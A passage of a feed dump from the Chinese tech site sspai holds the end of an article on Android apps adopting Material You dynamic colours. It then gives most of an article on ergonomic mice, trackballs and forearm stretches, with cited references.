src=\"https://cdn.sspai.com/editor/u_/c5ehp9tb34teh5fkvn9g.png\"></figure><p>唯一要吐槽的是 Tasker 在动态颜色选取上似乎有些跳脱，同样一张壁纸，Sleep as Android 采用配色方案明显要比 Takser 好看得多。这其实也反映出了一个问题：Material You 提取到的色彩只是第一步，能否合理使用这些提取到的颜色来为应用颜值加分，还得看应用开发者的实际理解。</p>\n<span class=\"ss-application\" app-id=\"1772\"> </span><h3>DarQ</h3>\n<p>DarQ 是一款借助 root 权限、为不支持深色主题的应用（比如 Handshaker ）强行开启深色界面的小工具。 在 6 月末的 <a href=\"https://github.com/KieronQuinn/DarQ/releases/tag/2.0\" target=\"_blank\">2.0 版本</a> 中，DarQ 就已经加入了对 Material You 色彩系统的支持，经过 7 月初 2.1 版本的小修小补之后，目前它在 Android 12 上的使用体验已经相当完善。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpa5b34teit0pn4ig.png\"></figure><p>值得一提的是 DarQ 作为一款工具应用，在应用设置的设计上也尽量向 Android 12 的系统设置看齐，顶部标题栏采用了大面积的留白、功能总开关也与系统设置的新样式保持一致，最大程度消弭了第三方工具与系统设置在视觉上的差异。</p>\n<h3>Inware</h3>\n<p>Inware 是一款类似 AIDA64 的系统信息检测工具，与 AIDA64 繁冗的设计相比， Inware 的 UI 更加现代一些，用一部分信息量的牺牲换取了更好的易读性。</p>\n<p>在最新的 Inware 测试版中，进入主界面右上角的软件设置，在外观菜单中便可以找到一个名为 Use system colors 的开关，将它打开之后就可以让 Inware 的配色方案与系统壁纸匹配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpalb34teh5fkvna0.png\"></figure><span class=\"ss-application\" app-id=\"16179\"> </span><h3>质感文件</h3>\n<p>与前文提到的文件极客不同，来自第三方开发者的质感文件一直以来都维持着标准化的 Material Design 风格设计。因此质感文件也是首批适配了 Material You 动态颜色的第三方应用之一，只需在应用设置中开启相关开关，即可解锁完全不同于预置主题方案的全新配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpatb34teh5fkvnag.png\"></figure><p>不过质感文件除了色彩方案的适配外目前倒是没有太多界面元素和控件上的翻新，这里不妨也期待以下这款小工具的后续更新。</p>\n<span class=\"ss-application\" app-id=\"16180\"> </span><h3>Swift Walls</h3>\n<p>Android 平台上的第三方壁纸 app 不胜枚举，但像 Swift Walls 这种同时对壁纸浏览、设置和编辑体验都同样重视的壁纸应用并不算多。Swift Walls 在最新版本中不仅适配了 Material You 的动态颜色，还大量采用了符合 Material Design 设计规范的界面控件，应用设置也向 Android 12 系统设置的整体风格看齐，视觉观感和使用体验都很不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpb5b34teit0pn4j0.png\"></figure><span class=\"ss-application\" app-id=\"15169\"> </span><h3>Infinity for Reddit</h3>\n<p>与 Twitter 和微博类似，社交网站 Reddit 同样通过开放相关接口的方式，为样式繁多的第三方客户端提供了展示技术和审美的机会。这其中就包括 Infinity for Reddit（下称 Infinity）。</p>\n<p>相比 Reddit 官方客户端，Infinity 在没有对主要功能布局进行改动的基础上为 app 添加了许多 Material Design 设计的风味——从 Material Design 2 时代风格的底部操作栏与居中悬浮操作按钮，到 5.0.4 版本中引入的 Material You 动态配色方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpblb34teit0pn4jg.png\"></figure><p>不过 Infinity 也存在和 Tasker 类似的问题，手动开启 Material You theme 开关后，它会将系统色表中几个饱和度比较高的关键色用作顶栏、底栏和信息卡片的默认背景色，看上去有些「用力过猛」了。不过 Infinity 本身也为这个问题提供了一套相当成熟的解决方案：在启用 Material You 主题开关之后，我们仍然可以手动对应用内几乎每一处颜色进行修改。</p>\n<span class=\"ss-application\" app-id=\"16181\"> </span><h3>Todoist</h3>\n<p>Google 第一方待办应用 Google Tasks 在更换新图标之余似乎没有跟进 Material You 的迹象，多次荣登少数派首页的知名 GTD 应用 Todoist 则趁机弯道超车，在 v8602 版本中为用户带来了 Material You 动态颜色支持。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpc5b34teh3cl8vt0.png\"></figure><p>值得肯定的是，Todoist 的动态主题色选项也没有放进订阅解锁区域当中，免费版用户在安装最新测试版本后也能进入设置菜单手动打开；不过目前 Todoist 的动态配色方案还没来得及适配深色主题，也无法跨平台同步到其它设备上。</p>\n<span class=\"ss-application\" app-id=\"9874\"> </span><h3>通知滤盒</h3>\n<p>通知滤盒也是少数派首页的「常客」。作为一款系统通知管理软件，它可以从另外一个角度解决垃圾短信的问题——既然收到垃圾短信是很难避免的，那么不让它们弹通知出来烦人便也曲线救国实现了「管理」的目标。</p>\n<p>在最近更新的通知滤盒 v2.1.1 中，开发者为其接入了 Material You 动态配色方案，甚至应用右下角的悬浮操作按钮也如 Google 应用一样改成了圆角矩形样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpclb34teh3cl8vtg.png\"></figure><span class=\"ss-application\" app-id=\"15141\"> </span><h3>Tachiyomi</h3>\n<p>作为一款免费、开源的 Android 漫画阅读器，<a href=\"https://tachiyomi.org/\" target=\"_blank\">Tachiyomi</a> 一直以来也是 Material Design 的忠实追随者，其众多 <a href=\"https://tachiyomi.org/forks\" target=\"_blank\">分支</a> 也可以说是百花齐放，体现着不同开发者对于 Tachiyomi 在功能和设计上的不同理解。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpctb34teit0pn4k0.png\"></figure><p>目前 Tachiyimi 已经支持了 Material You 动态配色方案，一些优秀分支，比如 <a href=\"https://tachiyomi.org/forks/#tachiyomij2k\" target=\"_blank\">TachiyomiJ2K</a> 更是适配了 Android 12 的 SplashScreen API，拥有惊艳的开屏动画效果。</p>\n<h2>小结</h2>\n<p>在 Google Pixel 的体验中，Material You 仅仅只是 Google 为 Android 12 所设计的视觉和交互体验的一部分：以 Pixel Launcher 为出发点，Google 应用可以根据桌面壁纸套用不同色彩风格的桌面图标；从点击图标启动应用到进入应用完成主界面加载这段时间内，系统会调用 <a href=\"https://developer.android.com/reference/android/window/SplashScreen\" target=\"_blank\">SplashScreen API</a> 带来舒适、自然的闪屏动画效果；进入应用后，基于 Material You 动态色彩的设计则会将壁纸和启动器中那种熟悉的视觉观感延续到应用内部。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpe5b34teh0gc1nt0.gif\"><figcaption>从桌面图标到应用内的效果</figcaption></figure><p>回顾 Material Design 从发展至今的历程，可以说今年应该是新设计语言在 Android 平台适配速度最快、覆盖面最广的一年。借由形状、色彩和动画都更加活泼多变的 Material You，Google 也将此前宣传的 <a href=\"https://material.io/design/material-theming/overview.html#material-theming\" target=\"_blank\">Material Theming</a>（借助 Material Design 打造品牌辨识度）推向了一个新的高度。至少在今年晚些时候正式开源之前，看见类似本文出现的截图时我们都会马上反应过来——这是 Material You，这是 Google 为 Pixel 系列机型打造的 Android 12 视觉体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpedb34teh3cl8vug.gif\"><figcaption>Material Theming | 图：Google</figcaption></figure><p>不过目前我们看到的这套 Material You 适配方案也暴露出了一些问题。</p>\n<p>从设计上来说，Material You 在 Google 自家应用中的一些细节依然存在冲突，比如 Android 12 锁屏 PIN 码的大色块圆钮会在按下时变为圆角矩形，但同样采用大色块圆钮设计的计算器却没有采用这种反馈动画，再比如不同 Google 应用的适配程度依然参差不齐，Gmail 团队显然也对 Material You 底栏设计有着不同的看法，在后续更新的版本中对默认的底栏高度进行了微调。</p>\n<p>好消息是，虽然这套基于壁纸的取色系统最快也要等到 <a href=\"https://www.xda-developers.com/android-12-1-monet-open-source/\" target=\"_blank\">Android 12.1</a> 才会开源，在此之前 OPPO、三星等厂商也已经跟随 Android 12 进行了底层适配，但在最近放出的 One UI 4 Beta 版本中，三星已经开始回应 Google 的设计思路了（<a href=\"https://www.xda-developers.com/samsung-one-ui-4-beta-2-android-12-galaxy-s21/\" target=\"_blank\">来源</a>）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/article/bf4cbaf7584a1c7fbda65173bed2f2ff\" alt=\"One UI 4 beta 2 color theme\"><figcaption>One UI 4 中的 Material You 动态色彩适配 | 图：XDA</figcaption></figure><p>你如何看待 Material You 和现有 Google 应用中的 Material You 设计，还有哪些适配了 Material You 的好应用本文没有提到？欢迎在评论区留下你的看法。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69117"},{"title":"它或许能拯救你酸痛的手臂：浅谈人体工学鼠标","date":"2021-10-06 03:00:00","description":"\n<p>此前我曾经写过一篇介绍 <a href=\"https://sspai.com/post/67354\" target=\"_blank\">人体工学键盘</a> 的文章，而本文的主角——人体工学鼠标——与它一样，是为了减少使用者手部疲劳、延缓劳损发生而设计的。</p>\n<p>如果你了解鼠标的起源，应该就会对下图中那个靠双滚轮活动的方盒子有点印象。这是 Douglas Engelbart 在 1968 年发明的第一款「鼠标」，原本叫做「显示系统的 X-Y 座标指示器」，它代表了人机交互领域的一次全新尝试，也开启了一个全新的时代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2g5b34teh5fkvc5g.png\"></figure><p>而后续的鼠标制造商，也或多或少地承袭这样的设计理念。在最初的几年里，机械鼠标基本维持这样方盒子的形态。随着使用的增多，使用者和厂商才意识到流线型的重要性，给鼠标套上了不同的外壳，逐渐演变成我们目前能见到的，最为基本的对称、曲线、左右主按键的设计。</p>\n<p>这样的设计其实是有隐患的。要想说清楚这一点，我们需要使用鼠标时，你胳膊的状态说起。</p>\n<h2>什么姿势对手臂最友好？</h2>\n<p>每一个关节都有自己适当的活动方向，每种活动也有一定的活动范围（活动度）。比如肩关节，作为人体最灵活的关节，它可以完成屈、伸、收、展、旋转和环转六类基本运动，六类运动组合形成日常生活中我们需要的各种复杂运动；当肩关节的外展时，最大可达 180°，而让肩关节后伸，最大就只有 60°。<sup class=\"ss-footnote\" href=\"https://web.mit.edu/tkd/stretch/stretching_8.html#SEC87\" title=\"https://web.mit.edu/tkd/stretch/stretching_8.html#SEC87\" footnote-id=\"1\">1</sup></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2gdb34teh5fkvc60.png\"><figcaption>从左至右：前屈、后伸、外展与内收、内旋、外旋，图源：sequencewiz.com</figcaption></figure><p>由于这种活动限制的存在，我们生活中需要进行的各种动作往往需要动用多个关节，而相应地，同一个动作，经常也可以靠不同的关节活动达成。拿「移动鼠标」这件事来说，你可以固定肩膀、肘部，仅靠手腕或手指完成活动；也可以减少手腕和手指的活动，选择手肘或是肩膀运动来带动鼠标。借用游戏玩家的术语，这就是常说的所谓的「<strong>手腕流</strong>」和「<strong>手臂流</strong>」。与此相关的，还有一个很著名的论点：</p>\n<blockquote><p>（FPS）职业选手手臂流居多。</p></blockquote>\n<p>职业游戏玩家可以视作极端化的一般办公室人群，他们使用鼠标更加频繁、幅度更大、更需要长时间、高精准度的操作。而当谈及采用手臂流的原因时，讨论大多就指向了「精准度」——由于手指和手腕的活动范围较小，玩家不得不把灵敏度提高以进行大角度转向，这样手部的小幅震颤也会加倍地体现在准星上；相应地，手臂流玩家就可以采用更大的活动幅度以及更低的灵敏度。</p>\n<p>但职业选手之所以采用「手臂流」，或者说用肘关节和肩关节完成大幅度移动，除去个人习惯的偏好外，还有一部分原因和手部健康脱不开干系。</p>\n<p>在此，我需要引入一个概念：「<strong>中立位</strong>（neutral position）」。</p>\n<p>所谓中立位，指的是每个关节的静止位置。当关节相关的神经、肌腱、肌肉和骨骼都处在最小张力或压力状态下时，关节自然处在的默认位置即为「中立位」。<sup class=\"ss-footnote\" href=\"https://health.uconn.edu/occupational-environmental/wp-content/uploads/sites/25/2016/01/workstation_adjustment.pdf\" title=\"https://health.uconn.edu/occupational-environmental/wp-content/uploads/sites/25/2016/01/workstation_adjustment.pdf\" footnote-id=\"2\">2</sup> 这种状态下的肌肉可以最有效地发力，关节在这一位置造成的磨损也最小。</p>\n<p>上世纪 80 年代前，NASA 在 Skylab 上完成了对 12 名宇航员在微重力环境下完全放松的自然姿势的测量，这为后续人体工学设备的设计提供了重要依据。这一姿势被称作<strong>中立体态</strong>（Neutral Body Posture，NBP）。当然，在重力环境下，我们的具体数值可能略有不同，比如肘关节的屈曲范围可达 0~135°/150°，但中立位在 90°~110° 之间。但上肢部分的姿态基本一致：上臂略展，肘关节屈曲，手部中线与前臂中线同轴，手指自然弯曲。后续各种人体工学设备的设计思路也基本都遵循了维持中立体态的原则，包括此前讨论过的 <a href=\"https://sspai.com/post/67354\" target=\"_blank\">人体工学键盘</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2glb34teh3cl8k60.png\"><figcaption>图源：<a href=\"https://spinoff.nasa.gov/Spinoff2013/t_4.html\" target=\"_blank\">NASA Spinoff</a></figcaption></figure><p>对于惯用手腕活动鼠标的人来说，在进行大范围移动时，手腕需要反复左右弯折（桡偏与尺偏），而这两个动作的最大活动范围相加，只有 50° 上下，何况移动半径只有手掌的长度。这样的动作向上移交给肩关节和肘关节后，却可以分解为屈肘、展肩这样对关节来说没什么负担的动作。同时，完成这些动作所需的肌肉也不会受到过分牵拉，神经、肌腱等结构也能在一个合适且安全的范围内活动。</p>\n<p>人体的自适应机制比较强大，如果感到不适，动作也会自动进行调整。逐渐地，依靠手臂瞄准也就成了一种大范围现象。FPS 职业选手比例尤其高，主要还是因为对快速拉枪等高速运动的需求更多，单纯使用手腕的伤害更大，大幅度动作就自然地向手臂肌肉移动，只留下小范围微调由手腕控制。</p>\n<h2>什么样的鼠标能减轻手部疲劳？</h2>\n<p>人体是一副精妙的机器。我们全身上下的骨骼、肌肉、神经等等组织器官共同构成了这套复杂的系统。问题在于，它和诸多器械一样，不按照最合适的方式使用与维护，就会加速磨损，最终造成功能和结构的损伤。</p>\n<p>长期坐办公室的朋友可能遇到过或大或小的手部问题。有人可能手指酸胀、麻木；有人在活动关节时疼痛、弹响；有一些更严重的，在不活动时手掌也开始疼痛，甚至在夜间痛醒。考虑到办公室发放/配备的鼠标很有可能是尺寸偏小的对称鼠标，这些疼痛与不适就更像是身体对不当工作姿势和劳作强度提出的严正抗议（，最严重的那种已经称得上是起义了）。大部分的不适都可以在足量的休息后恢复，但如果你的工作限制了你的休息空间，选择合适的鼠标和键盘、采用更健康的姿势，可以大大延缓这些职业劳损的发生。</p>\n<h3>从对称鼠到垂直鼠</h3>\n<p>很多人在使用对称鼠时并没有感受过太明显的不适，其实是因为在不需要精准操作时，手臂会自己调整到一个舒服的姿态，以更符合自然角度的模式搭在鼠标上，而你可能并没有意识到。</p>\n<figure class=\"ss-imgRows\" figcaption=\"完全放松使用对称鼠标，手部也会自然摆出倾斜的姿势。\"><img src=\"https://cdn.sspai.com/2021/09/30/1f1a6f60c33cef6405d3432588f28935.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/30/93cf472e2da2f4cc1a7b02a89b3407cc.jpg\" alt=\"\"></figure><p>这样的休息姿势并不方便控制鼠标，只能做做简单的点击。对于需要长时间高精准使用鼠标的群体来说，比起让身体调整，更好的方法是让鼠标外形发生变化，让它为使用者提供一个可以自然搭握的外形，既能方便地握紧，又能减少手腕、手臂扭转带来的肢体压力。</p>\n<p>这就是人体工学鼠标的基本目的。而设计这样的鼠标，最简单的方法就是把处在自然放松状态下的小臂转到桌面上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2gtb34teit0pmpc0.jpeg\"><figcaption>Evoluent Vertical Mouse 4，图源：<a href=\"https://www.ergonomicessentials.com.au/blog/why-are-evoluent-vertical-mice-so-popular/\" target=\"_blank\">ErgonomicEssentials</a></figcaption></figure><p>很多经典的办公工学鼠标都选择了这样的策略，这一类型的鼠标常常被称作「垂直鼠标」。一般认为最早的人体工学鼠标就是 Jack Lo 在 1994 年发明的「握手握法」鼠标 Evoluent，这是第一款为全手掌提供竖直支撑的鼠标。</p>\n<p>竖直设计的鼠标最直观的效果就是能让趴在桌面上的手腕和前臂以一个自然的角度稍稍悬空，直接减轻外界压力，同时可以方便活动。此后，越来越多的品牌依循类似的思路，开发了各式各样的人体工学鼠标模具。</p>\n<h4>罗技 MX Vertical</h4>\n<p>罗技在办公室外设上投入的心血是很多品牌难以比拟的，毕竟不是每个办公室外设厂商都会建立人体工学实验室。MX Vertical 作为 Ergo 系列的经典产品，在保证外观设计符合人体工学的基础上，搭载了罗技的优联技术，并且支持罗技 Flow，可以多设备跨屏使用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2h5b34teh5fkvc6g.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2hdb34teit0pmpcg.jpeg\" alt=\"\"></figure><p>MX Vertical 是我用过一段时间的鼠标，外观设计和选料都让人爱不释手。但它相对无强制手指定位的设计可能在握持时造成一定的误解。刚开始使用的一两天里，我始终感觉这款鼠标定位不准，后来发现是我的握姿不对——虎口并不是紧贴在弧度最明显的点位的，手指也不用僵硬地伸直。如上图所示，这款鼠标俯视时显得很扭曲，是因为顶部越收越窄，最终收在一个偏左的位置，符合了手部自然状态时类似握手的状态。正确的握姿是手放松地搭在宽大的底盘稍上，手指无需伸直，自然蜷曲时，虎口位置低且斜，停在弧度最明显位置的其实是食指根部。在调整了自己的握姿后，定位也正常了，手也更加舒适，小臂的酸痛都少了一些。</p>\n<h4>山业 Sanwa Supply 人体工学系列</h4>\n<p>来自日本的山业其实生产了不少符合人体工学设计的竖直鼠标，不知道什么原因，他们总是被大家遗忘，只能怪中文名太不响亮了。由于配色克制、设计经典，山业的鼠标常常成为其他厂商翻模山寨的对象。其中最经典的，莫过于带腕托的 MA-ERGW6。</p>\n<figure class=\"ss-imgRows\" figcaption=\"图：Sanwa Supply 官网，左 MA-ERGW6，右 400-MA059\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2hlb34teit0pmpd0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2htb34teh0gc1cg0.png\" alt=\"\"></figure><p>与 MX Vertical 相比，山业各个型号的鼠标外形都更加远离常规印象中的「鼠标」，除了 MA-ERGW6 这种带腕托的大块头之外，还有 400-MA059 这种取消了主按键、以晃动代替点击、从而做到左右手可通用的绝对异类（可惜已经停售）。比起附带了更多利于办公的技术的罗技，山业就像是老老实实的匠人，一门心思在模具上下工夫。</p>\n<h4>微软 Sculpt Ergonomic</h4>\n<p>之前在 <a href=\"https://sspai.com/post/67355\" target=\"_blank\">少数派员工用什么外设</a> 的文章里，我提到过这个圆滚滚的大馒头。虽然和上面提到的这些实打实的竖直鼠标有些差别，但实际体验上，它在手部支撑的饱满程度上基本可以归为一档。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2htb34teit0pmpdg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2i5b34teh3cl8k6g.png\" alt=\"\"></figure><p>微软在人体工学外设方面同样耕耘多年。这支昵称「大馒头」的鼠标在近几年微软的新模具中最引人注目。虽然外表看起来像闹着玩一样，但它对手掌的支撑是实打实的好。对于目前那些办公室桌椅高度不合适又不可调的群体来说，这个整体高度稍稍有些离谱的鼠标反而可以在大部分桌面保证使用者的手腕足够悬空不被压迫，同时手掌受到足够支撑不至于太累。虽然外形和之前的两个品牌差别巨大，实际体验上，Sculpt Ergonomic 的握感还是更接近竖直鼠标，饱满，手部更直立，手腕压迫小。</p>\n<h3>在舒适与易用中平衡</h3>\n<p>还有一类「人体工学鼠标」，在外形上就没有这么激进，它们更多地是在保留过往使用习惯和操控灵活度的基础上，对右手支撑进行适配。游戏玩家更容易接受这类鼠标。我习惯把它们笼统地称为「人体工学游戏鼠标」，罗技的 G403 系列模具、雷蛇当家的蝰蛇系列模具、ZOWIE 的 EC 系列，都是经典的右手人体工学鼠标。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：罗技 G403，右：ZOWIE EC2\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2idb34teh3cl8k70.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2ilb34teit0pmpe0.png\" alt=\"\"></figure><p>通常来说，竖直鼠标由于外形比较怪异，和常规使用鼠标的姿势差别过大，购买者往往是对鼠标的精准度要求不高但使用频次高的办公室人群。这也使得竖直鼠标的厂商更倾向于选择那些适合在各种平面使用的引擎，最有代表性的就是微软的蓝影，在办公鼠标界撑起一篇天的各型号激光引擎也是这样，我把这些硬性能比较落后的引擎统称为「办公引擎」。</p>\n<p>办公鼠标引擎的问题就是不适合游戏，尤其是 FPS 游戏。由于追踪速度和传感器帧率这两项指标的落后，激光引擎和蓝影可以做到「精准」，但它的精准只在慢速下成立。快速滑动使用了办公引擎的鼠标导致的丢帧可能会带来画面的抽搐、快速闪动、不跟手等等游戏体验上的意外，有可能导致眩晕——至少我疯狂选购外设的道路就是从这里开始的。</p>\n<p>这一类型的鼠标我在 <a href=\"https://sspai.com/post/66327\" target=\"_blank\">游戏鼠标指南</a> 一文之中有过介绍。单就人体工学的舒适程度这一方面来说，这类鼠标的实际效果较小，顶多相当于让你的手处在「使用对称鼠时拿来休息的位置」。但如果你平常游戏玩得很多，而且不打算把办公和游戏的鼠标分开，这样的人体工学鼠标其实也是不错的选择。它最大的特点，就是有大量厂商使用了性能足够强劲的<strong>光电鼠标引擎</strong>，保证各方面性能都跟得上时代主流。具体购买时，可以对照我在游戏鼠标指南的文章中提到的选购原则。一定要注意手长。对于需要打游戏的使用者来说，尺寸的宽容度会变小，因为在需要仔细瞄准时，人会下意识抓紧鼠标，再加上手汗带来的影响，过大和过小的尺寸都会让手更加紧张。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2itb34teh3cl8k7g.jpeg\"><figcaption>比如我用的 MM720 和 ROG 月刃，对平均手来说就小了一些，分别代表了强制人体工学和一般人体工学两种设计。</figcaption></figure><h3>另辟蹊径的选择</h3>\n<p>如果你对这些都不感兴趣，或许可以试试别的指点设备。即使桌面够大、不需要使用专业软件，<strong>轨迹球</strong>也是一个不错的选择。</p>\n<p>既然鼠标的活动方式会让你的手腕不适，前臂麻木，那干脆不要在桌面上移动鼠标。轨迹球的设计给了足够的手部调整空间。手指用累了用手掌，右手用累了换左手。</p>\n<h4>Kensington 轨迹球</h4>\n<p>在这个几乎所有公司都要停产轨迹球设备的年代，Kensington 依旧屹立如初。作为可能是目前最大的轨迹球生产商，Kensington 提供了各式各样的轨迹球设计，有线无线、腕托按键、四指或拇指，只要想要，基本都有。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2j5b34teh3cl8k80.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jdb34teit0pmpeg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jlb34teit0pmpf0.png\" alt=\"\"></figure><h4>罗技 MX Ergo</h4>\n<p>罗技也是少数尚未停产轨迹球产品的厂商之一。MX Ergo 和 Ergo M575 是 Ergo 系列中现在还在售的轨迹球型号。两者的设计思路基本一致，最大的差别在于 MX Ergo 支持额外的角度调整。相比只能平趴的 M575，MX Ergo 允许使用者斜向抬起最大 20°，进一步贴合手臂角度。但这两款都是拇指轨迹球，对于一部分用户来说可能需要<strong>谨慎选择</strong>。由于这种设计限制了轨迹球只能由右手拇指操作，大量使用拇指也可能影响拇指的健康，选择时需要参考自己的使用习惯。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：罗技 MX Ergo，右：罗技 Ergo M575\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jtb34teh5fkvc70.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2k5b34teit0pmpfg.png\" alt=\"\"></figure><h2>更换设备也不能忘记放松</h2>\n<p>工学鼠标推荐了不少，这些类型的鼠标都可以让你的工作生活稍微少一点点疲劳，即使没直接看到自己心仪的型号，联系之前的鼠标选购指南，相信你也能知道选购适合自己的鼠标的方法。可说到底，它们仍然是工作用品。鼠标的舒适，只能让你的疲劳和损伤来得慢一点、轻一点，如果不进行日常的保护和拉伸，选择工学鼠标也不能让你逃离被劳损找上门的命运。</p>\n<p>可能有人会说，自己的对称鼠标也用得挺好，没觉得会造成损伤。但这涉及的其实是几个方面平衡的问题：<strong>鼠标重量</strong>，<strong>个人体质</strong>，和<strong>鼠标外形</strong>。如果鼠标的造型对手腕和手臂不甚友好，它就要做到足够轻，来减小你移动鼠标时对手腕和手臂造成的冲击；如果鼠标的外形合适，它的重量就可以大一些。近来游戏鼠标的轻量化、无线化趋势其实也是这个道理：对称鼠标更适合快速移动、操作更加敏捷，也就是所谓的「跟手」，但想要让它对你的身体结构友好，它就要轻到让你注意不到使用时胳膊承受的拉伸。但更早些时候，鼠标总是做重来凸显高级，鼠标「越重越稳」的错误观念也还是在消费者的脑子里植根，这种观念下选择的超重鼠标其实是在赌自己的体质足够刚猛——疼痛发生的那一刻前，你永远不会觉得它有问题。</p>\n<p>此外需要额外提及一点：鼠标最好不要随意使用腕托。如果你的鼠标没有放在比较低的位置，甚至已经需要弯折手腕使用鼠标的情况下，加一个腕托不仅不会缓解疲劳，反而会因为对手腕造成压迫进一步加重腕部不适。真正有效的鼠标腕托需要配合正确的高度、正确的姿势并给予人体工学的设计，那种便宜的海绵腕托提供的柔软感觉非常具有欺骗性，给你的是虚假的舒适。悬空的疲惫也好过压迫的危险。</p>\n<p>在一篇关于「重复性劳损」（RSI，repetitive strain injury）的文章中，作者提出，RSI 这个名词本身就过于笼统，覆盖了太多的与职场相关的上肢疼痛，并不是一个良好的医学术语。而目前的研究看来，对于受到「RSI」侵扰的上班族来说，最难的就是证明这种疼痛与职场状态的关联。</p>\n<p>但同样，文章也指出，这些疼痛、病变等在很大程度上与对神经、血管、肌肉有影响的动作相关，包括过度拉伸、震动等。矿工、学生、网球运动员、高尔夫球运动员等常见的肘部职业病就是比较典型的例子。长期坐在桌前、缺乏运动的办公人士，即使生理上没有产生病变，心理变化也可能造成身体感知的异常。所以，即使更换了设备，最好还是定期活动拉伸手臂，多方位防护才能避免异常疼痛的发生。</p>\n<h3>Mayo Clinic 推荐的前臂拉伸法</h3>\n<p>接下来介绍的这种拉伸方法十分简单，但确实有效。在工作前与长时间工作后进行拉伸，可以让你的前臂提前进入活动状态，并在几乎固定的工作后得到放松。你可以前往 <a href=\"https://www.mayoclinic.org/healthy-lifestyle/adult-health/multimedia/forearm-stretches/vid-20084698\" target=\"_blank\">Forearm stretches for the workplace</a> 观看指导视频，以下图片均来自 Mayo Clinic 视频截图，当然了，这些动作非常简单，只阅读文字描述就可以标准地做好。</p>\n<p>在整个拉伸过程中，保持正常呼吸，不要憋气。动作轻柔，如果你感到疼痛，说明你的动作太大了。</p>\n<h4>第一步</h4>\n<p>自然抬起一支手臂，手腕自然下垂。另一只手将下垂的手向内拉伸，感觉上臂有「肌肉拉伸」的感觉即可，保持 15 秒。之后换手，重复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2kdb34teh5fkvc7g.png\"></figure><h4>第二步</h4>\n<p>自然抬起一支手臂，这次手掌向上。另一只手将抬起的手向内拉伸，感觉上臂有「肌肉拉伸」的感觉即可，保持 15 秒。之后换手，重复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2ktb34teh3cl8k8g.png\"></figure><h4>第三步</h4>\n<p>双臂平举放松，两只手缓慢绕手腕向内旋转，活动 15~30 秒后，换方向向外旋转，重复。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2l5b34teh0gc1cgg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2llb34teit0pmpg0.png\" alt=\"\"></figure><p>其他部位的拉伸也推荐每日重复。</p>\n<p>希望你在工作中保持健康，不会遭受疼痛的困扰。</p>\n<h4>相关参考</h4>\n<p>Helliwell PS, Taylor WJ. Repetitive strain injury. <i>Postgraduate Medical Journal</i> 2004;80:438-443.</p>\n<p>UCSF, Maintain a Neutral Posture, https://ehs.ucsf.edu/maintain-neutral-posture</p>\n<p>Mayo Clinic, <a href=\"https://www.mayoclinic.org/healthy-lifestyle/adult-health/multimedia/forearm-stretches/vid-20084698\" target=\"_blank\">Forearm stretches for the workplace</a> (Video)</p>\n<p>身体各部位中立位：University of Wisconsin System, <a href=\"https://www.wisconsin.edu/ehs/osh/ergonomics-2/maintaining-neutral-postures/\" target=\"_blank\">Maintaining Neutral Postures</a></p>\n<p>Cornell University Ergonomics Web, <a 